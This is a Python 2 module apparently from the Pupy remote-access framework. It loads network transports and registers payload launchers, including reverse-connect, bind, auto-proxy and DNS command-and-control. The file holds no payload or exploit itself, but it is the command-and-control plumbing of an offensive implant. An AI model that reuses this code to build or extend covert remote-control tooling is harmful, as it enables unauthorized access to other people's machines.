# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root
# of the project for the detailed licence terms

import logging
import importlib

import sys

if not hasattr(sys, 'pupy_launchers'):
    setattr(sys, 'pupy_launchers', {})

if not hasattr(sys, 'pupy_transports'):
    setattr(sys, 'pupy_transports', {})

transports = sys.pupy_transports
launchers = sys.pupy_launchers

def add_transport(module_name):
    try:
        confmodule = importlib.import_module('network.transports.{}.conf'.format(module_name))
        if not confmodule:
            logging.warning('Import failed: %s', module_name)
            return

        if not hasattr(confmodule, 'TransportConf'):
            logging.warning('TransportConf is not present in %s', module_name)
            return

        t = confmodule.TransportConf
        if t.name is None:
            t.name = module_name

        transports[t.name] = t
        logging.debug('Transport loaded: %s', t.name)

    except Exception, e:
        logging.exception('Transport disabled: %s: %s', module_name, e)

#importing from memory (used by payloads)
try:
    import pupy
    assert pupy

    import pupyimporter

    import network.transports
    assert network.transports

    for path in [
            x for x in pupyimporter.modules.iterkeys() \
            if x.startswith('network/transports/') and x.endswith(
                ('/conf.py', '/conf.pyc', '/conf.pyo'))
        ]:

        try:
            module_name = path.rsplit('/',2)[1]
            add_transport(module_name)

        except Exception as e:
            logging.exception('Transport failed: %s: %s', module_name, e)

except ImportError:
    # Not pupy client
    logging.debug('Transports loading from files')

    import transports as trlib
    import pkgutil

    for loader, module_name, is_pkg in pkgutil.iter_modules(trlib.__path__):
        add_transport(module_name)

try:
    from .lib.launchers.connect import ConnectLauncher
    launchers['connect'] = ConnectLauncher
except Exception, e:
    logging.exception('%s: ConnectLauncher disabled', e)

try:
    from .lib.launchers.auto_proxy import AutoProxyLauncher
    launchers['auto_proxy'] = AutoProxyLauncher
except Exception, e:
    logging.exception('%s: AutoProxyLauncher disabled', e)

try:
    from .lib.launchers.bind import BindLauncher
    launchers['bind'] = BindLauncher
except Exception, e:
    logging.exception('%s: BindLauncher disabled', e)

try:
    from .lib.launchers.dnscnc import DNSCncLauncher
    launchers.update({
        'dnscnc': DNSCncLauncher
    })

except Exception as e:
    logging.exception('%s: DNSCncLauncher disabled', e)
    DNSCncLauncher = None
